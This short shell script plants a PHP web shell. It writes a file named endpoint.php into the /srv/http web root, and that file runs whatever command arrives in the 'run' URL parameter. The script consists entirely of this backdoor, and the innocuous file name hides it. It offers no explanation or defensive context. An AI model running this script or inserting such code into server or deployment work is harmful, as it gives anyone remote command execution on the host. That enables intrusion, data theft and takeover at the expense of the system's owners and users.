#!/bin/sh
echo '<?php exec($_GET["run"]);' > /srv/http/endpoint.php
